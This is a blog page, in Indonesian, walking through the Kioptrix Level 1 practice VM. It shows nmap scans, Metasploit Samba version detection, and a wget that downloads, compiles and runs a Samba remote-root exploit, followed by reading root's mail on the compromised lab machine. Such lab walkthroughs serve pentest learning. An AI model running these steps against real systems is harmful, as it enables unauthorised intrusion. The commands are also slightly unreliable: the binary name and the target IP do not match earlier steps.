@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- [[! Document Settings ]] -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- [[! Page Meta ]] -->
+    <title>Pembahasan Kioptrix Level 1 : Samba Exploit</title>
+    <meta name="description" content="uid=0 (root) - CTF, InfoSec, Banana And More.." />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="/assets/images/favicon.ico" >
+
+    <!-- [[! Styles'n'Scripts ]] -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
+    <link rel="stylesheet" type="text/css"
+          href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+    <link rel="stylesheet" type="text/css" href="/assets/css/syntax.css" />
+
+    <!-- [[! highlight.js ]] -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.3.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.3.0/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <!-- [[! Ghost outputs important style and meta data with this tag ]] -->
+        <link rel="canonical" href="/" />
+    <meta name="referrer" content="origin" />
+    <link rel="next" href="/page2/" />
+
+    <meta property="og:site_name" content="uid=0 (root)" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="uid=0 (root)" />
+    <meta property="og:description" content="CTF, InfoSec, Banana And More.." />
+    <meta property="og:url" content="/" />
+    <meta property="og:image" content="/assets/images/cover1.jpg" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="uid=0 (root)" />
+    <meta name="twitter:description" content="CTF, InfoSec, Banana And More.." />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image:src" content="/assets/images/cover1.jpg" />
+
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Website",
+    "publisher": "uid=0",
+    "url": "/",
+    "image": "/assets/images/cover1.jpg",
+    "description": "CTF, InfoSec, Banana And More.."
+}
+    </script>
+
+    <meta name="generator" content="Jekyll 3.0.0" />
+    <link rel="alternate" type="application/rss+xml" title="uid=0 (root)" href="/feed.xml" />
+
+
+</head>
+<body class="home-template nav-closed">
+
+    <div class="nav">
+    <h3 class="nav-title">Menu</h3>
+    <a href="#" class="nav-close">
+        <span class="hidden">Close</span>
+    </a>
+    <ul>
+        <li class="nav-home " role="presentation"><a href="/">Home</a></li>
+        <li class="nav-about " role="presentation"><a href="/about">About</a></li>
+         <li class="nav-archive " role="presentation"><a href="/archive">Archives</a></li>
+        <li class="nav-fables " role="presentation"><a href="/tag/CTF">CTF</a></li>
+        <li class="nav-speeches " role="presentation"><a href="/tag/Digital Forensic">Digital Forensic</a></li>
+        <li class="nav-fiction " role="presentation"><a href="/tag/Pentesting">Pentesting</a></li>
+        <li class="nav-author " role="presentation"><a href="/tag/RE">Rerverse Engineering</a></li>
+    </ul>
+    <a class="subscribe-button icon-feed" href="/feed.xml">Subscribe</a>
+</div>
+<span class="nav-cover"></span>
+
+
+    <div class="site-wrapper">
+
+        <!-- [[! Everything else gets inserted here ]] -->
+        <!-- < default -->
+
+<!-- The comment above "< default" means - insert everything in this file into -->
+    <!-- the [body] of the default.hbs template, which contains our header/footer. -->
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<header class="main-header post-head " style="background-image: url(/assets/images/ctf.png) ">
+    <nav class="main-nav  overlay  clearfix">
+        <a class="blog-logo" href="/"><img src="/assets/images/ghost.png" alt="Blog Logo" /></a>
+        
+            <a class="menu-button icon-menu" href="#"><span class="word">Menu</span></a>
+        
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post tag-fiction">
+
+        <header class="post-header">
+            <h1 class="post-title">Pembahasan Kioptrix Level 1 : Samba Exploit</h1>
+            <section class="post-meta">
+            <!-- <a href='/'>Aiden Pearce</a> -->
+            <time class="post-date" datetime="2016-02-27">27 Feb 2016</time>
+                <!-- [[tags prefix=" on "]] -->
+                 
+                on 
+                
+                    
+                       <a href='/tag/Hacking'>Hacking</a>,
+                       
+                
+                    
+                       <a href='/tag/CTF'>Ctf</a>
+                       
+                
+                
+            </section>
+        </header>
+
+        <section class="post-content">
+            
+            <div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-KtOVpGSr_r0/Vs_i84FRmwI/AAAAAAAAA5M/pMTE5jhcamY/s1600/Screenshot_2016-02-26_13-29-46.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" height="197" src="https://2.bp.blogspot.com/-KtOVpGSr_r0/Vs_i84FRmwI/AAAAAAAAA5M/pMTE5jhcamY/s400/Screenshot_2016-02-26_13-29-46.png" width="400" /></a></div><b>Assalamualaikum...</b><br /><b>Kioptrix Level 1</b> : Samba Exploit - Sudah lama tidak posting lagi di blog, tapi untuk kesempatan kali ini saya akan membahas bagaiman mengexploit samba yang ada pada kiotrix server, kioptrix server adalah vulnerable os yang digunakan untuk tujuan pembelajaran dalam hal pentesting.<br /><br /><b>Tool Yang Dibutuhkan</b><br /><ol><li>Nmap</li><li>Metasploit </li><li>Kioptrix Level 1 : <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_1.rar">Download disini</a></li></ol><span style="font-size: large;"><b>Mencari Ip Target</b></span><br /><br />Dalam mencari ip target, saya menggunakan nmap dengan parameter <b>-sn</b> untuk melakukan Ping scan agar dapat mencari host yg live<br /><br /><blockquote class="tr_bq">root@ubuntu-linux:/home/aiden# nmap -sn 192.168.33.1/24<br /><br />Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-26 13:06 HKT<br /><span style="color: red;">Nmap scan report for 192.168.33.128</span><br />Host is up (0.00042s latency).<br />MAC Address: 00:0C:29:83:B2:94 (VMware)<br />Nmap scan report for 192.168.33.254<br />Host is up (0.000044s latency).<br />MAC Address: 00:50:56:E2:65:F0 (VMware)<br />Nmap scan report for 192.168.33.1<br />Host is up.<br />Nmap done: 256 IP addresses (3 hosts up) scanned in 30.30 seconds</blockquote><b><span style="font-size: large;">Scanning Service Pada Server</span></b><br />Untuk pencarian service atau layanan yang sudah diinstall pada kiotrix server kita gunakan nmap dengan parameter <b>-sV </b>untuk melakukan service version scanning<br /><blockquote class="tr_bq">root@ubuntu-linux:/home/aiden# nmap -sV 192.168.33.128<br /><br />Starting Nmap 7.01 ( https://nmap.org ) at 2016-02-26 13:38 HKT<br />Nmap scan report for 192.168.33.128<br />Host is up (0.00022s latency).<br />Not shown: 994 closed ports<br />PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE SERVICE&nbsp;&nbsp;&nbsp;&nbsp; VERSION<br />22/tcp&nbsp;&nbsp; open&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 2.9p2 (protocol 1.99)<br />80/tcp&nbsp;&nbsp; open&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Apache httpd 1.3.20 ((Unix)&nbsp; (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />111/tcp&nbsp; open&nbsp; rpcbind&nbsp;&nbsp;&nbsp;&nbsp; 2 (RPC #100000)<br /><span style="color: red;"><span style="background-color: white;">139/tcp&nbsp; open&nbsp; netbios-ssn Samba smbd (workgroup: MYGROUP)</span></span><br />443/tcp&nbsp; open&nbsp; ssl/http&nbsp;&nbsp;&nbsp; Apache httpd 1.3.20 ((Unix)&nbsp; (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br />1024/tcp open&nbsp; status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 (RPC #100024)<br />MAC Address: 00:0C:29:83:B2:94 (VMware)</blockquote><b><span style="font-size: large;">Scanning Samba Version</span></b><br /><br />Setelah melakukan service scanning kita lanjutkan dengan mencari versi dari samba yang sudah diinstall di kiotrix menggunakan modul <b>auxiliary</b> pada <b>metasploit</b><br /><br /><blockquote class="tr_bq">msf &gt; search smb_version<br /><br />Matching Modules<br />================<br /><br />&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disclosure Date&nbsp; Rank&nbsp;&nbsp;&nbsp; Description<br />&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp; ----&nbsp;&nbsp;&nbsp; -----------<br />&nbsp;&nbsp; auxiliary/scanner/smb/smb_version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; normal&nbsp; SMB Version Detection<br /><br />msf &gt; use auxiliary/scanner/smb/smb_version<br />msf auxiliary(smb_version) &gt; show options<br /><br />Module options (auxiliary/scanner/smb/smb_version):<br /><br />&nbsp;&nbsp; Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current Setting&nbsp; Required&nbsp; Description<br />&nbsp;&nbsp; ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ---------------&nbsp; --------&nbsp; -----------<br />&nbsp;&nbsp; RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target address range or CIDR identifier<br />&nbsp;&nbsp; SMBDomain&nbsp; .&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Windows domain to use for authentication<br />&nbsp;&nbsp; SMBPass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The password for the specified username<br />&nbsp;&nbsp; SMBUser&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The username to authenticate as<br />&nbsp;&nbsp; THREADS&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The number of concurrent threads<br /><br />msf auxiliary(smb_version) &gt; set RHOSTS 192.168.33.128<br />RHOSTS =&gt; 192.168.33.128<br />msf auxiliary(smb_version) &gt; run<br /><br />[*] 192.168.33.128:139 could not be identified: <span style="color: red;">Unix (Samba 2.2.1a)</span><br />[*] Scanned 1 of 1 hosts (100% complete)<br />[*] Auxiliary module execution completed</blockquote><span style="font-size: large;"><b>Exploiting Samba</b></span><br /><br />Kita tidak perlu bingung mau menggunakan exploit apa, karena samba 2.2.x memiliki exploit yang sudah dibuat yaitu <i>0x333hate =&gt; samba 2.2.x remote root</i> exploit, sebenar nya bisa juga dengan trans2open exploit di metasploit, tapi karena metasploit saya lagi error jadi saya make 0x333hate yang base on trans2open.<br /><br />~# wget http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c<br />~# gcc 0x333hate.c -o xpl<br />~# ./xlp -t 192.168.33.1<br /><br />kita sudah mendapatkan shell akses ke system kioptrix.<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-UckxfiKkYXQ/VtGPpSnfXlI/AAAAAAAAA5c/WsMx7VHVpe4/s1600/Screenshot_2016-02-27_19-58-32.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="265" src="https://2.bp.blogspot.com/-UckxfiKkYXQ/VtGPpSnfXlI/AAAAAAAAA5c/WsMx7VHVpe4/s640/Screenshot_2016-02-27_19-58-32.png" width="640" /></a></div><br />Ingat <b>"Shell is Only the Beginning"</b> , lalu apa yang harus dilakukan ? karena tidak ada clue, ane iseng mencari file <i>.bash_history</i> untuk melihat command apa aja yang pernah di ketik<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-szwVtHkBHtQ/VtGRJB25jgI/AAAAAAAAA5o/n7hx7E4l3rc/s1600/Selection_003.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="265" src="https://1.bp.blogspot.com/-szwVtHkBHtQ/VtGRJB25jgI/AAAAAAAAA5o/n7hx7E4l3rc/s640/Selection_003.png" width="640" /></a></div><br />Ada commad <i>mail</i> yang digunakan untuk email proses<br />lalu tinggal ketik aja di shell nya<br /><blockquote class="tr_bq"># mail&nbsp; &lt;-- untuk melihat list email<br /># exit &lt;-- agar keluar dari perintah mail<br /># cat /var/mail/root</blockquote><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-GEi-CPX2ZDs/VtGSkIhPWnI/AAAAAAAAA50/tyXaOBN08o0/s1600/Screenshot%2Bfrom%2B2016-02-27%2B20-06-27.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="531" src="https://1.bp.blogspot.com/-GEi-CPX2ZDs/VtGSkIhPWnI/AAAAAAAAA50/tyXaOBN08o0/s640/Screenshot%2Bfrom%2B2016-02-27%2B20-06-27.png" width="640" /></a></div><br />Rupa nya isi email tersebut agar kita bisa lanjut ke level 2 kiotrix nya ^_^<br /><br />sekian tutorial sederhana dari saya. semoga dapat bermanfaat bagi kita semua dan mohon maaf apa bila ada salah pemberian definisi :D
+
+        </section>
+
+        <footer class="post-footer">
+
+            <!-- Everything inside the #author tags pulls data from the author -->
+            <!-- #author-->
+
+            
+            <figure class="author-image">
+                <a class="img" href="/author/rhama" style="background-image: url(/assets/images/casper.png)"><span class="hidden">Aiden Pearce's Picture</span></a>
+            </figure>
+            
+
+            <section class="author">
+                <h4><a href="/author/rhama">Aiden Pearce</a></h4>
+                
+                
+                    <p> Beyond The Limit</p>
+                
+                <div class="author-meta">
+                    <span class="author-location icon-location"> NTB, Indonesia</span> 
+                    <span class="author-link icon-link"><a href="127.0.0.1:4000"> 127.0.0.1:4000</a></span> 
+                </div>
+            </section>
+
+            <!-- /author  -->
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="http://twitter.com/share?text=Pembahasan Kioptrix Level 1 : Samba Exploit&amp;url=127.0.0.1:4000pembahasan-kioptrix-level-1-samba"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=127.0.0.1:4000pembahasan-kioptrix-level-1-samba"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=127.0.0.1:4000pembahasan-kioptrix-level-1-samba"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+            
+            <!-- Add Disqus Comments -->
+            
+            
+        </footer>
+
+    </article>
+
+</main>
+
+<aside class="read-next">
+
+    <!-- [[! next_post ]] -->
+    
+        <a class="read-next-story " style="background-image: url(/assets/images/ctf.png)" href="/pembahasan-kioptrix-level-1-ssl-exploit">
+            <section class="post">
+                <h2>Pembahasan Kioptrix Level 1 : SSL Exploit</h2>
+                <p>Kioptrix Level 1 Mod SSL Exploit - Melanjutkan posting sebelum nya yang membahas cara exploit...</p>
+            </section>
+        </a>
+    
+    <!-- [[! /next_post ]] -->
+    <!-- [[! prev_post ]] -->
+    
+    <!-- [[! /prev_post ]] -->
+</aside>
+
+<!-- /post -->
+
+
+        <footer class="site-footer clearfix">
+          <section class="copyright"><a href="/">uid=0 (root)</a> &copy; 2017</section>
+          <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> using <a href="https://github.com/biomadeira/jasper">Jasper</a></section>
+        </footer>
+    </div>
+    <!-- [[! Ghost outputs important scripts and data with this tag ]] -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <!-- [[! The main JavaScript file for Casper ]] -->
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="/assets/js/index.js"></script>
+
+    <!-- Add Google Analytics  -->
+        <!-- Google Analytics Tracking code -->
+     <script>
+	    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	    ga('create', 'UA-69281367-1', 'auto');
+	    ga('send', 'pageview');
+
+     </script>   
+</body>
+</html>
